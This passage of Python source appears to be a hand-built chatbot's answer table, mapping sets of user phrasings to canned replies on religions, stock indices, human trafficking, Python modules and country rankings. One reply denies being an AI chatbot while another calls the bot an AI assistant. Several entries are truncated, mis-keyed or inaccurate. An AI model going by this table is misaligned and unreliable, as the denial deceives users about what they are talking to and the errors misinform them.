        }): "Lilly Singh is a Canadian YouTuber, comedian, and talk show host, known for her comedic sketches and social media content, as well as for hosting 'A Little Late with Lilly Singh'.",
        
        frozenset({
            "who is salman bhai",
            "define salman bhai",
            "tell me about salman bhai",
            "explain salman bhai"
        }): "Salman Bhai (Salman Khan) is an Indian actor and YouTuber known for his involvement in Bollywood movies, charity work, and his YouTube presence.",
        
        frozenset({
            "who is technical sagar",
            "define technical sagar",
            "tell me about technical sagar",
            "explain technical sagar"
        }): "Technical Sagar is an Indian YouTuber who focuses on tech reviews, tutorials, and security-related topics, particularly ethical hacking and technology.",
        
        frozenset({
            "who is dhruv rathee",
            "define dhruv rathee",
            "tell me about dhruv rathee",
            "explain dhruv rathee"
        }): "Dhruv Rathee is an Indian YouTuber known for his insightful commentary on politics, current affairs, and social issues.",
        
        frozenset({
            "who is abhi and niyu",
            "define abhi and niyu",
            "tell me about abhi and niyu",
            "explain abhi and niyu"
        }): "Abhi and Niyu are Indian YouTubers who create content around social issues, motivational videos, and educational content to inspire people.",
        frozenset({
            "what is judaism",
            "tell me about judaism",
            "what does judaism teach?",
            "who are the key figures in judaism?",
            "what are the sacred texts of judaism?"
        }): "Judaism is one of the oldest monotheistic religions, centered around the belief in one God. The key figures include Abraham, Moses, and King David. The Torah, which is part of the Hebrew Bible, is the primary sacred text of Judaism, outlining laws and teachings.",

        frozenset({
            "what is sikhism",
            "tell me about sikhism",
            "what does sikhism teach?",
            "who is the founder of sikhism?",
            "what are the key beliefs in sikhism?"
        }): "Sikhism is a monotheistic religion founded by Guru Nanak in the 15th century in Punjab. Sikhs believe in one God and follow the teachings of ten Gurus. Key principles include devotion to God, equality, service to others, and living an honest life. The Guru Granth Sahib is the central sacred text.",

        frozenset({
            "what is DevOps",
            "what is devops",
            "define devops",
            "explain devops",
            "define DevOps",
            "how does DevOps work",
            "explain DevOps methodology"
        }): "DevOps is a set of practices that combines software development (Dev) and IT operations (Ops) to shorten the system development lifecycle and provide continuous delivery of high-quality software.",

        frozenset({
            "what is containerization",
            "define containerization",
            "how does containerization work",
            "explain containerization"
        }): "Containerization involves encapsulating software and its dependencies into containers to ensure consistency across multiple environments, widely used in DevOps and microservices.",

        frozenset({
            "what is Kubernetes",
            "what is kubernetes",
            "define kubernetes",
            "explain kubernetes",
            "what is kubernetes?",
            "define Kubernetes",
            "how does Kubernetes work",
            "explain Kubernetes"
        }): "Kubernetes is an open-source platform for automating the deployment, scaling, and management of containerized applications, widely used in cloud-native environments.",

    frozenset({
        "what is sensex",
        "define sensex",
        "how does sensex work",
        "explain sensex"
    }): "The Sensex (Sensitive Index) is the benchmark index of the Bombay Stock Exchange (BSE) in India, representing the top 30 companies listed on the exchange, calculated based on free-float market capitalization.",

    frozenset({
        "what is nifty",
        "define nifty",
        "how does nifty work",
        "explain nifty"
    }): "The Nifty 50 is the benchmark index of the National Stock Exchange (NSE) in India, comprising 50 of the largest and most liquid stocks listed on the NSE, providing an indicator of the Indian stock market’s performance.",

    frozenset({
        "what is market capitalization",
        "define market capitalization",
        "how does market capitalization work",
        "explain market capitalization"
    }): "Market capitalization is the total value of a company's outstanding shares, calculated by multiplying the stock price by the total number of shares. It helps assess a company’s size and investment potential.",

    frozenset({
        "what is a stock index",
        "define stock index",
        "how does a stock index work",
        "explain stock index"
    }): "A stock index is a measurement of the performance of a group of stocks, representing a sector or the overall market. Examples include Sensex, Nifty, S&P 500, and Dow Jones Industrial Average.",

    frozenset({
        "what is an index fund",
        "define index fund",
        "how does index fund work",
        "explain index fund"
    }): "An index fund is a type of mutual fund or exchange-traded fund (ETF) designed to track the performance of a specific stock index, like the Sensex or Nifty, by investing in the same securities that make up the index.",

    frozenset({
        "what is the BSE",
        "define BSE",
        "what is bse",
        "explain bse",
        "what is the bse",
        "how does BSE work",
        "explain BSE"
    }): "The BSE (Bombay Stock Exchange) is one of the oldest and largest stock exchanges in India, where various financial instruments like stocks, bonds, and derivatives are traded.",

    frozenset({
        "what is the NSE",
        "define NSE",
        "what is nse",
        "define nse",
        "explain nse",
        "what is the nse",
        "how does NSE work",
        "explain NSE"
    }): "The NSE (National Stock Exchange) is the leading stock exchange in India, providing a platform for the electronic trading of stocks, derivatives, and other financial instruments.",

    frozenset({
        "what is free-float market capitalization",
        "define free-float market capitalization",
        "how does free-float market capitalization work",
        "explain free-float market capitalization"
    }): "Free-float market capitalization is the market capitalization of a company based on the number of shares that are available for trading, excluding locked-in shares or those held by insiders.",

    frozenset({
        "what is the BSE 100",
        "define BSE 100",
        "define bse 100",
        "what is bse 100",
        "what is bse 100?",
        "explain bse 100",
        "how does BSE 100 work",
        "explain BSE 100"
    }): "The BSE 100 is an index on the Bombay Stock Exchange representing the top 100 companies based on market capitalization, offering a broader view of the Indian market compared to the Sensex.",

    frozenset({
        "what is the Nifty 50",
        "what is nifty",
        "define nifty",
        "what is nifty 50",
        "explain nifty",
        "define Nifty 50",
        "how does Nifty 50 work",
        "explain Nifty 50"
    }): "The Nifty 50 is an index of 50 of the most significant and liquid stocks on the National Stock Exchange, widely used to gauge the performance of the Indian stock market.",

    frozenset({
        "what is the Dow Jones Industrial Average",
        "define Dow Jones",
        "what is dow jones industrial average",
        "define dow jones",
        "explain dow jones",
        "what is the dow jones industrial average",
        "how does Dow Jones work",
        "explain Dow Jones"
    }): "The Dow Jones Industrial Average (DJIA) is a stock market index that includes 30 large, publicly traded companies in the U.S., often used to reflect the overall health of the stock market and economy.",

    frozenset({
        "what is the S&P 500",
        "what is s&p",
        "what is S&P",
        "define S&P",
        "define S&P 500",
        "how does S&P 500 work",
        "explain S&P 500"
    }): "The S&P 500 is a stock market index that tracks the performance of 500 large publicly traded companies in the U.S., serving as a broad indicator of the American economy and stock market performance.",

    frozenset({
        "what is a market index",
        "define market index",
        "how does market index work",
        "explain market index"
    }): "A market index is a composite measurement of the stock market or a segment of it, such as the Sensex, Nifty, or S&P 500, and is used to assess market trends and performance.",

    frozenset({
        "what is a benchmark index",
        "define benchmark index",
        "how does benchmark index work",
        "explain benchmark index"
    }): "A benchmark index is a standard used for comparing the performance of an individual investment portfolio or financial instrument, often using indices like the Sensex, Nifty, or S&P 500 for comparison.",

    frozenset({
        "what is the All-Share Index",
        "what is all share index",
        "what is all-share index",
        "define all share index",
        "define All-Share Index",
        "how does All-Share Index work",
        "explain All-Share Index"
    }): "The All-Share Index is a stock market index that represents the performance of all listed stocks on a particular exchange, such as the London Stock Exchange’s FTSE All-Share Index.",

    frozenset({
        "what is a stock ticker",
        "define stock ticker",
        "how does stock ticker work",
        "explain stock ticker"
    }): "A stock ticker is a unique identifier or symbol used to represent a specific stock or security on the stock market. For example, Reliance Industries is represented by 'RELIANCE' on the BSE and NSE.",

    frozenset({
        "effects of human trafficking",
        "impact of human trafficking",
        "how does human trafficking affect victims",
        "what are the effects of human trafficking",
        "human trafficking consequences",
        "human trafficking ka asar kya hai",
        "human trafficking ke prabhav"
    }): "Human trafficking has severe effects, including physical and emotional trauma, loss of freedom, social isolation, economic exploitation, and long-term psychological damage to victims.",

    frozenset({
        "types of human trafficking",
        "different types of human trafficking",
        "forms of human trafficking",
        "kinds of human trafficking",
        "human trafficking ke prakar",
        "human trafficking kitne prakar ke hote hain"
    }): "The main types of human trafficking are sexual exploitation, forced labor, domestic servitude, child trafficking, forced marriage, and organ trafficking.",

    frozenset({
        "human trafficking laws",
        "laws against human trafficking",
        "anti-human trafficking laws",
        "what are the laws to prevent human trafficking",
        "human trafficking laws in India",
        "human trafficking act",
        "human trafficking par kanoon"
    }): "Laws against human trafficking include international protocols and national laws that criminalize trafficking, protect victims, and prosecute traffickers, like the UN Trafficking Protocol and India's Immoral Traffic (Prevention) Act.",

    frozenset({
        "statistics on human trafficking",
        "how many people are trafficked",
        "human trafficking numbers",
        "human trafficking data",
        "victims of human trafficking",
        "kitne log human trafficking ke shikar hain",
        "human trafficking ki sankhya"
    }): "Globally, millions of people are victims of human trafficking, with women and children being the most affected. The exact numbers vary by region and reporting methods.",

    frozenset({
        "human trafficking and modern slavery",
        "difference between human trafficking and slavery",
        "is human trafficking modern slavery",
        "relationship between human trafficking and slavery",
        "human trafficking aur modern slavery ka sambandh",
        "human trafficking slavery hai kya"
    }): "Human trafficking is often referred to as modern slavery because it involves exploiting individuals through force, fraud, or coercion for personal or financial gain.",

    frozenset({
        "signs of human trafficking",
        "how to identify human trafficking victims",
        "indicators of human trafficking",
        "what are the signs of human trafficking",
        "human trafficking ke lakshan",
        "kaise jane koi human trafficking ka shikar hai"
    }): "Signs of human trafficking include lack of freedom, physical injuries, fearfulness, restricted movement, poor living conditions, and being controlled by someone else.",

    frozenset({
        "what is the BSE Sensex",
        "what is bse index",
        "define bse index",
        "define BSE Sensex",
        "how does BSE Sensex work",
        "explain BSE Sensex"
    }): "BSE Sensex is the benchmark index of the Bombay Stock Exchange (BSE), tracking the performance of 30 major companies, and is widely regarded as a barometer of the Indian stock market.",

        frozenset({
            "what is data encryption",
            "define data encryption",
            "how does data encryption work",
            "explain data encryption"
        }): "Data encryption is the process of converting data into a secure format using algorithms to prevent unauthorized access, ensuring confidentiality and integrity of the information.",

        frozenset({
            "what is a relational database",
            "define relational database",
            "how does a relational database work",
            "explain relational database"
        }): "A relational database stores data in tables with predefined relationships between them, allowing structured querying and management using SQL (Structured Query Language).",

        frozenset({
            "what is a neural network architecture",
            "define neural network architecture",
            "how does neural network architecture work",
            "explain neural network architecture"
        }): "Neural network architecture refers to the structure of a neural network, consisting of input, hidden, and output layers, with nodes (neurons) connected by weights to learn patterns in data.",

        frozenset({
            "what is a serverless architecture",
            "define serverless architecture",
            "how does serverless work",
            "explain serverless computing"
        }): "Serverless architecture allows developers to build and run applications without managing servers, using cloud services to automatically handle scaling and infrastructure.",

        frozenset({
            "what is a neural network",
            "define neural network",
            "how does a neural network work",
            "explain neural networks"
        }): "A neural network is a computational model inspired by the human brain, consisting of layers of interconnected nodes that process data for pattern recognition, used in deep learning.",

        frozenset({
            "what is a compiler",
            "define compiler",
            "how does a compiler work",
            "explain compiler"
        }): "A compiler is a program that translates source code written in a high-level programming language into machine code or intermediate code that a computer can execute.",

        frozenset({
            "what is a distributed system",
            "define distributed system",
            "how does a distributed system work",
            "explain distributed systems"
        }): "A distributed system is a network of independent computers that work together to provide a single unified service, improving scalability, fault tolerance, and resource sharing.",

        frozenset({
            "what is a microprocessor",
            "define microprocessor",
            "how does a microprocessor work",
            "explain microprocessor"
        }): "A microprocessor is a small, integrated circuit that serves as the brain of a computer, executing instructions and controlling the operation of the computer system.",

        frozenset({
            "what is a container orchestration system",
            "define container orchestration",
            "how does container orchestration work",
            "explain container orchestration"
        }): "Container orchestration is the management of containerized applications, ensuring automated deployment, scaling, and management of containers across clusters of machines, with Kubernetes being a popular tool.",

        frozenset({
            "what is deep reinforcement learning",
            "define deep reinforcement learning",
            "how does deep reinforcement learning work",
            "explain deep reinforcement learning"
        }): "Deep reinforcement learning is a combination of deep learning and reinforcement learning, where agents learn to make decisions by interacting with an environment and receiving rewards or penalties.",

        frozenset({
            "what is 3D printing",
            "what is 3d printing",
            "define 3d printing",
            "explain 3d printing",
            "define 3D printing",
            "how does 3D printing work",
            "explain 3D printing"
        }): "3D printing is an additive manufacturing process that creates three-dimensional objects from a digital model by layering material, typically plastic, metal, or resin.",

        frozenset({
            "what is taoism",
            "tell me about taoism",
            "what does taoism teach?",
            "who founded taoism?",
            "what are the beliefs of taoism?"
        }): "Taoism is an ancient Chinese philosophy and religion that emphasizes living in harmony with the Tao, which is the fundamental principle that is the source of all existence. It teaches simplicity, spontaneity, and the natural flow of life. Laozi, the author of the Tao Te Ching, is considered the founder of Taoism.",

        frozenset({
            "what is confucianism",
            "tell me about confucianism",
            "what does confucianism teach?",
            "who is the founder of confucianism?",
            "what are the key beliefs of confucianism?"
        }): "Confucianism is a philosophy founded by Confucius in the 5th century BCE, emphasizing morality, social harmony, respect for tradition, and the importance of education. It is not a religion but a way of life that has influenced Chinese culture and society deeply.",

        frozenset({
            "what is jainism",
            "tell me about jainism",
            "what does jainism teach?",
            "who is the founder of jainism?",
            "what are the beliefs of jainism?"
        }): "Jainism is an ancient religion originating in India that emphasizes non-violence (ahimsa), truth, and asceticism. Jains believe in the importance of self-discipline and the liberation of the soul through the elimination of karma. The Tirthankaras, including Lord Mahavira, are revered as spiritual leaders in Jainism.",

        frozenset({
            "what is zoroastrianism",
            "tell me about zoroastrianism",
            "what does zoroastrianism teach?",
            "who founded zoroastrianism?",
            "what are the key beliefs in zoroastrianism?"
        }): "Zoroastrianism is one of the world's oldest monotheistic religions, founded by the prophet Zoroaster (or Zarathustra) in ancient Persia. It teaches the worship of Ahura Mazda, the supreme god, and emphasizes the importance of good thoughts, good words, and good deeds in life.",

        frozenset({
            "what is bahá'í faith",
            "tell me about bahá'í faith",
            "what does bahá'í faith teach?",
            "who is the founder of bahá'í faith?",
            "what are the beliefs of bahá'í faith?"
        }): "The Bahá'í Faith is a monotheistic religion founded by Bahá'u'lláh in the 19th century. It teaches the unity of all religions, the equality of all people, and the importance of global peace and justice. Bahá'ís believe that all major religions come from the same divine source.",

        frozenset({
            "what is shinto",
            "tell me about shinto",
            "what does shinto teach?",
            "who founded shinto?",
            "what are the key beliefs of shinto?",
            "what are the practices of shinto?",
            "what does shinto teach",
            "who founded shinto",
            "what are the key beliefs of shinto",
            "what are the practices of shinto",
        }): "Shinto is an indigenous religion of Japan that focuses on the worship of kami (spirits or gods) in nature and ancestors. It emphasizes rituals, purity, and harmony with the natural world. Shinto has no single founder and has been practiced in Japan for centuries.",
        
        frozenset({
            "what is jehovah's witnesses",
            "what is jehovah witnesses",
            "tell me jehovah witness",
            "tell me jehovah witnesses",
            "tell me about jehovah witnesses"
            "tell me about jehovah's witnesses",
            "what does jehovah's witnesses teach?",
            "who founded jehovah's witnesses?",
            "what are the beliefs of jehovah's witnesses?"
        }): "Jehovah's Witnesses is a Christian denomination known for their door-to-door evangelism and belief in the imminent return of Jesus Christ. They follow the teachings of the Bible and believe in the importance of spreading the message of God's kingdom.",
        
        frozenset({
            "what is scientology",
            "tell me about scientology",
            "what does scientology teach?",
            "who founded scientology?",
            "what are the beliefs of scientology?"
        }): "Scientology is a religious movement founded by L. Ron Hubbard that focuses on the spiritual rehabilitation of individuals through counseling and self-improvement techniques. It teaches that humans are immortal spiritual beings who have forgotten",
        
        frozenset({
            "what is wicca",
            "tell me about wicca",
            "what does wicca teach?",
            "what does wicca teach",
            "who founded wicca?",
            "what are the beliefs of wicca?"
        }): "Wicca is a modern pagan religion that emphasizes nature worship, magic, and the balance of masculine and feminine energies. It was popularized by Gerald Gardner in the mid-20th century and draws on pre-Christian traditions.",

        frozenset({
            "what is framework",
            "define framework",
            "explain framework",
            "explain me framework",
            "what is framework?",
            "what is the framework",
            "what is a framework",
            "what is a framework?"
        }): "A framework is a basic structure or set of ideas that provides support for something. It can be a real or conceptual structure that helps guide the building of something useful",

        frozenset({
            "what is kimochi yamate",
            "what is kimochi yamate",
            "explain kimochi yamate",
            "define kimochi yamate",
            "tell me what is kimochi yamate"
        }): """
"Kimochi" (気持ち) is a Japanese word that means "feeling" or "emotion." It's often used to express pleasure or satisfaction, but the context can vary.

"Yamate" (やめて) means "stop" or "don't" in Japanese. When combined, "Kimochi yamete" (気持ちやめて) can roughly translate to "Stop it, it feels good" or "Don't, it's too much," often used in an informal or playful context, particularly in anime or internet memes.
        """,

        frozenset({
        "show me all foods names",
        "write all foods names",
        "tell me cuisines",
        "what are the best cuisines",
        "list of all foods",
        "foods list",
        "give me food names",
        "what foods do you know",
        }): """
Here are some popular foods with their respective cuisines:
- Pizza (Italian)
- Pasta (Italian)
- Sushi (Japanese)
- Ramen (Japanese)
- Tempura (Japanese)
- Tacos (Mexican)
- Burritos (Mexican)
- Enchiladas (Mexican)
- Guacamole (Mexican)
- Dim Sum (Chinese)
- Peking Duck (Chinese)
- Kung Pao Chicken (Chinese)
- Biryani (Indian)
- Butter Chicken (Indian)
- Samosa (Indian)
- Naan (Indian)
- Dosa (Indian)
- Shahi Paneer (Indian)
- Chole Bhature (Indian)
- Pani Puri (Indian)
- Aloo Paratha (Indian)
- Pho (Vietnamese)
- Banh Mi (Vietnamese)
- Gỏi Cuốn (Vietnamese Spring Rolls) (Vietnamese)
- Shawarma (Middle Eastern)
- Falafel (Middle Eastern)
- Hummus (Middle Eastern)
- Poutine (Canadian)
- Maple Syrup (Canadian)
- Fish and Chips (British)
- Shepherd's Pie (British)
- Croissant (French)
- Baguette (French)
- Escargot (French)
- Kimchi (Korean)
- Bulgogi (Korean)
- Bibimbap (Korean)
- Hamburger (American)
- Hot Dog (American)
- Apple Pie (American)
- Fries (American)
- Ceviche (Peruvian)
- Anticuchos (Peruvian)
- Feijoada (Brazilian)
- Churrasco (Brazilian)
- Satay (Indonesian)
- Nasi Goreng (Indonesian)
- Laksa (Singaporean)
        """,

        frozenset({
            "good morning", 
            "good morning!"
        }): "Good Morning! Have a great day ahead!",

        frozenset({
            "good afternoon", 
            "good afternoon!"
        }): "Good Afternoon! Hope you're having a good day!",

        frozenset({
            "good evening", 
            "good evening!"
        }): "Good Evening! Hope you had a wonderful day!",

        frozenset({
            "good night", 
            "good night!"
        }): "Good Night! Sweet dreams!",

        frozenset({
            "happy birthday", 
            "happy birthday!"
        }): "Happy Birthday! Have a fantastic day!",

        frozenset({
            "do you love me?", 
            "do you love me"
        }): "I'm here to help you, so yes, I care about you!",

        frozenset({
            "i love you", 
            "i love you!", 
            "i luv you"
        }): "I'm here to help you, so I care about you too!",

        frozenset({
            "what are python standard libraries",
            "define python standard libraries",
            "list of python standard libraries",
            "what is a python standard library",
            "explain python standard libraries"
        }): "Python standard libraries are a collection of pre-built modules that come bundled with Python, providing a wide range of functionalities like file handling, networking, databases, and more.",

        frozenset({
            "list of python standard libraries",
            "python standard libraries examples",
            "what is included in python standard library",
            "examples of python standard libraries"
        }): "Some examples of Python standard libraries include 'os', 'sys', 'math', 'datetime', 'json', 'csv, 'argparse', 'socket', 're', 'sqlite3', 'shutil', and 'collections'.",

        frozenset({
            "what are python third party libraries",
            "define python third party libraries",
            "list of python third party libraries",
            "what is a python third party library",
            "explain python third party libraries"
        }): "Third-party libraries in Python are additional modules and packages developed by the community and available for installation via package managers like `pip`. They extend Python's functionality for specialized tasks like web development, machine learning, data science, etc.",

        frozenset({
            "list of popular python third party libraries",
            "examples of python third party libraries",
            "what are popular third party libraries in python",
            "python third party libraries examples"
        }): "Some popular third-party libraries include `numpy` (for numerical computing), `pandas` (for data manipulation), `requests` (for HTTP requests), `matplotlib` (for plotting graphs), `flask` (for web development), `tensorflow` (for machine learning), and `scikit-learn` (for machine learning).",

        frozenset({
            "does santa claus exist?", 
            "is santa claus real?", 
            "does santa claus really exist?", 
            "is santa claus real"
        }): "Santa Claus is a symbol of the holiday season and the spirit of giving!",

        frozenset({
            "do you have a hobby?", 
            "what's your hobby?", 
            "what is your hobby"
        }): "I enjoy helping people and learning new things!",

        frozenset({
            "tell me about your personality", 
            "what's your personality like?", 
            "what is your personality", 
            "what is your personality like"
        }): "I'm here to help you with information and tasks, and I'm always learning!",

        frozenset({
            "are you ai chatbot",
            "are you a chatbot",
            "are you ai chatbot?",
            "are you an ai chatbot",
            "are you an ai chatbot?"
        }): "No, I am not an AI chatbot. I have limited knowledge about general topics, But i can help with tech related topics, and have 70+ useful comands!",

        frozenset({
            "what is nlp",
            "define nlp",
            "explain nlp",
            "what is nlp?"
        }): "NLP (NLP (Natural Language Processing) is a field of AI that enables machines to understand, interpret, and respond to human language. It combines linguistics and computer science to process text or speech data.)",

        frozenset({
            "what is your mother's name?", 
            "what is your mother's name"
        }): "I'm an AI assistant, so I don't have a mother! But I have a father named 'Lucky Singh'",

        frozenset({
            "what is abc module",
            "define abc module",
            "what is abc module used for",
            "explain abc module"
        }): "The abc module defines abstract base classes for defining abstract methods and enforcing interfaces, helping create a framework for defining and implementing classes with certain required methods.",

        frozenset({
            "what is argparse module",
            "define argparse module",
            "what is argparse module used for",
            "explain argparse module"
        }): "The argparse module is used for parsing command-line arguments, providing a way for the user to specify options and arguments when executing Python scripts.",

        frozenset({
            "what is array module",
            "define array module",
            "what is array module used for",
            "explain array module"
        }): "The array module provides an array data structure that stores elements of the same type more efficiently than a list. It is useful when you need to handle large amounts of numerical data.",

        frozenset({
            "what is asyncio module",
            "define asyncio module",
            "what is asyncio module used for",
            "explain asyncio module"
        }): "The asyncio module provides support for asynchronous programming, enabling you to write concurrent code using async/await syntax for tasks that involve I/O operations or waiting.",

        frozenset({
            "what is bisect module",
            "define bisect module",
            "what is bisect module used for",
            "explain bisect module"
        }): "The bisect module helps manage sorted lists by providing functions for inserting elements into a sorted list and finding insertion positions.",

        frozenset({
            "what is builtins module",
            "define builtins module",
            "what is builtins module used for",
            "explain builtins module"
        }): "The builtins module provides access to Python's standard built-in functions and exceptions, such as `print()`, `len()`, and `int()`.",

        frozenset({
            "what is calendar module",
            "define calendar module",
            "what is calendar module used for",
            "explain calendar module"
        }): "The calendar module provides functions for working with calendars and dates, including checking if a year is a leap year and printing a calendar for any month or year.",

        frozenset({
            "what is collections module",
            "define collections module",
            "what is collections module used for",
            "explain collections module"
        }): "The collections module provides specialized container datatypes such as `namedtuple`, `deque`, `Counter`, `OrderedDict`, and `defaultdict` that offer more functionality than built-in data structures.",

        frozenset({
            "what is configparser module",
            "define configparser module",
            "what is configparser module used for",
            "explain configparser module"
        }): "The configparser module provides functionality for reading and writing configuration files, typically in .ini format, making it easy to manage settings in Python applications.",

        frozenset({
            "what is csv module",
            "define csv module",
            "what is csv module used for",
            "explain csv module"
        }): "The csv module allows you to read from and write to CSV (comma-separated values) files. It is useful for working with structured data in tabular form.",

        frozenset({
            "what is datetime module",
            "define datetime module",
            "what is datetime module used for",
            "explain datetime module"
        }): "The datetime module provides classes for manipulating dates and times. It supports date arithmetic, formatting, and parsing of time data.",

        frozenset({
            "what is decimal module",
            "define decimal module",
            "what is decimal module used for",
            "explain decimal module"
        }): "The decimal module provides support for fast decimal floating point arithmetic, offering better precision for financial calculations and other use cases where precision matters.",

        frozenset({
            "what is email module",
            "define email module",
            "what is email module used for",
            "explain email module"
        }): "The email module defines classes for managing email messages, including parsing MIME data, encoding and decoding emails, and generating email headers.",

        frozenset({
            "what is encodings module",
            "define encodings module",
            "what is encodings module used for",
            "explain encodings module"
        }): "The encodings module provides access to Python's codec registry and functions for converting between different character encodings.",

        frozenset({
            "what is enum module",
            "define enum module",
            "what is enum module used for",
            "explain enum module"
        }): "The enum module allows for the creation of enumerations, which are symbolic names bound to unique, constant integer values, offering more readable and self-documenting code.",

        frozenset({
            "what is fileinput module",
            "define fileinput module",
            "what is fileinput module used for",
            "explain fileinput module"
        }): "The fileinput module allows you to iterate over lines from multiple input streams or files, making it easier to process files in a flexible way.",

        frozenset({
            "what is functools module",
            "define functools module",
            "what is functools module used for",
            "explain functools module"
        }): "The functools module provides tools for working with functions and callables, including decorators, partial functions, and higher-order functions like `reduce`.",

        frozenset({
            "what is hashlib module",
            "define hashlib module",
            "what is hashlib module used for",
            "explain hashlib module"
        }): "The hashlib module provides secure hash algorithms like SHA-256, MD5, and others, useful for hashing data and creating digital signatures.",

        frozenset({
            "what is http module",
            "define http module",
            "what is http module used for",
            "explain http module"
        }): "The http module provides classes for managing HTTP requests and responses, including functionality for creating web clients and servers.",

        frozenset({
            "what is importlib module",
            "define importlib module",
            "what is importlib module used for",
            "explain importlib module"
        }): "The importlib module provides access to Python's import system, allowing you to import, reload, and manage modules dynamically.",

        frozenset({
            "what is io module",
            "define io module",
            "what is io module used for",
            "explain io module"
        }): "The io module provides tools for working with streams (input/output operations) in Python, such as reading and writing files or manipulating binary data.",

        frozenset({
            "what is itertools module",
            "define itertools module",
            "what is itertools module used for",
            "explain itertools module"
        }): "The itertools module provides functions for working with iterators, enabling efficient iteration over combinations, permutations, and other iterable patterns.",

        frozenset({
            "what is json module",
            "define json module",
            "what is json module used for",
            "explain json module"
        }): "The json module provides tools for encoding Python objects into JSON format and decoding JSON data back into Python objects.",

        frozenset({
            "what is logging module",
            "define logging module",
            "what is logging module used for",
            "explain logging module"
        }): "The logging module provides a flexible framework for logging messages in Python, helping you track application behavior, errors, and debugging information.",

        frozenset({
            "what is math module",
            "define math module",
            "what is math module used for",
            "explain math module"
        }): "The math module provides mathematical functions, such as trigonometric, logarithmic, and statistical functions, along with constants like pi and e.",

        frozenset({
            "what is multiprocessing module",
            "define multiprocessing module",
            "what is multiprocessing module used for",
            "explain multiprocessing module"
        }): "The multiprocessing module allows you to create and manage multiple processes in parallel, improving the performance of CPU-bound tasks.",

        frozenset({
            "what is os module",
            "define os module",
            "what is os module used for",
            "explain os module"
        }): "The os module provides a way to interact with the operating system, manage file systems, and handle processes and environment variables.",

        frozenset({
            "what is pathlib module",
            "define pathlib module",
            "what is pathlib module used for",
            "explain pathlib module"
        }): "The pathlib module provides object-oriented methods for working with file system paths, making it easier to perform file operations.",

        frozenset({
            "what is pickle module",
            "define pickle module",
            "what is pickle module used for",
            "explain pickle module"
        }): "The pickle module implements serialization and deserialization, allowing you to save Python objects to files and reload them later.",

        frozenset({
            "what is queue module",
            "define queue module",
            "what is queue module used for",
            "explain queue module"
        }): "The queue module provides classes like `Queue`, `LifoQueue`, and `PriorityQueue` for working with thread-safe, FIFO/LIFO priority queues.",

        frozenset({
            "what is random module",
            "define random module",
            "what is random module used for",
            "explain random module"
        }): "The random module generates pseudo-random numbers, making it useful for simulations, randomness in games, and testing.",

        frozenset({
            "what is re module",
            "define re module",
            "what is re module used for",
            "explain re module"
        }): "The re module enables working with regular expressions, providing powerful pattern matching and text manipulation capabilities.",

        frozenset({
            "what is shutil module",
            "define shutil module",
            "what is shutil module used for",
            "explain shutil module"
        }): "The shutil module provides higher-level file operations, such as copying, moving, and removing files and directories.",

        frozenset({
            "which is the most educated country",
            "what is the most educated country in the world",
            "list of most educated countries",
            "top most educated countries"
        }): "The most educated countries, according to global education rankings, include Canada, Japan, South Korea, Finland, and Denmark.",

        frozenset({
            "which country has the most diverse culture",
            "what is the country with the most diverse culture",
            "list of countries with most diverse cultures",
            "top countries with most diverse cultures"
        }): "Countries with the most diverse cultures include India, the United States, Brazil, South Africa, and Canada, known for their rich ethnic and cultural diversity.",

        frozenset({
            "which country has the best food",
            "what is the country with the best cuisine",
            "list of countries with the best food",
            "top countries with best food"
        }): "Countries known for their exceptional cuisine include Italy, France, Japan, Thailand, and India, offering a wide variety of flavors and culinary traditions.",

        frozenset({
            "which country is the best for tourism",
            "what is the best country for tourism",
            "list of best countries for tourism",
            "top countries for tourism"
        }): "Top tourism destinations include France, Spain, the United States, Italy, and China, offering diverse attractions such as historical landmarks, natural wonders, and cultural experiences.",

        frozenset({
            "which country has the best public transport",
            "what is the country with the best public transportation system",
            "list of countries with best public transport",
            "top countries with best public transport"
        }): "Countries with the best public transport systems include Japan, Germany, the Netherlands, Switzerland, and South Korea, offering efficient, reliable, and eco-friendly transportation.",

        frozenset({
            "which country has the most beautiful beaches",
            "what is the country with the most beautiful beaches",
            "list of countries with the most beautiful beaches",
            "top countries with beautiful beaches"
        }): "Countries known for their beautiful beaches include the Maldives, Thailand, Australia, Indonesia, and the Bahamas, offering pristine waters and scenic coastlines.",

        frozenset({
            "which country has the best education system",
            "what is the country with the best education system",
            "list of countries with best education systems",
            "top countries with best education systems"
        }): "Countries with the best education systems include Finland, South Korea, Canada, Japan, and Singapore, known for high academic performance and strong educational infrastructure.",

        frozenset({
            "which country has the best human rights record",
            "what is the country with the best human rights",
            "list of countries with best human rights",
            "top countries with best human rights"
        }): "Countries with the best human rights records include Denmark, Sweden, Finland, Norway, and Canada, known for their commitment to equality, freedom, and justice.",

        frozenset({
            "which country is the best for expats",
            "what is the best country for expats to live",
            "list of best countries for expats",
            "top countries for expats"
        }): "Top countries for expats to live in include Switzerland, Singapore, Spain, New Zealand, and the United Arab Emirates, offering good job opportunities, high quality of life, and ease of settling in.",

        frozenset({
            "which country has the most advanced healthcare technology",
            "what is the country with the most advanced healthcare technology",
            "list of countries with most advanced healthcare technology",
            "top countries with advanced healthcare technology"
        }): "Countries with the most advanced healthcare technologies include the United States, Germany, Switzerland, Sweden, and Japan, known for their cutting-edge medical innovations.",

        frozenset({
            "which country has the best social welfare system",
            "what is the country with the best social welfare system",
            "list of countries with best social welfare systems",
            "top countries with best social welfare systems"
        }): "Countries with the best social welfare systems include Sweden, Norway, Denmark, Finland, and the Netherlands, known for their strong social security, healthcare, and public services.",

        frozenset({
            "which is the most innovative country",
            "what is the most innovative country in the world",
            "list of most innovative countries",
            "top most innovative countries"
        }): "The most innovative countries include Switzerland, Sweden, the United States, Finland, and Denmark, based on the Global Innovation Index.",

        frozenset({
            "which country has the best economy",
            "what is the strongest economy in the world",
            "list of best economies",
            "top countries with best economy"
        }): "The countries with the strongest economies, based on GDP and economic stability, include the United States, China, Japan, Germany, and India.",

        frozenset({
            "which country has the best infrastructure",
            "what is the country with best infrastructure",
            "list of best infrastructure countries",
            "top countries with best infrastructure"
        }): "Countries with the best infrastructure include Singapore, Switzerland, the Netherlands, the United Arab Emirates, and Hong Kong.",

        frozenset({
            "which country is the most peaceful",
            "what is the most peaceful country",
            "list of most peaceful countries",
            "top most peaceful countries"
        }): "The most peaceful countries, according to the Global Peace Index, include Iceland, New Zealand, Portugal, Switzerland, and Austria.",

        frozenset({
            "which country has the best quality of life",
            "what is the best quality of life",
            "list of countries with best quality of life",
            "top countries with best quality of life"
        }): "Countries with the best quality of life include Norway, Switzerland, Denmark, Sweden, and Finland, based on factors such as health, safety, education, and cost of living.",

        frozenset({
            "which country is the most tech advanced",
            "what is the most technologically advanced country",
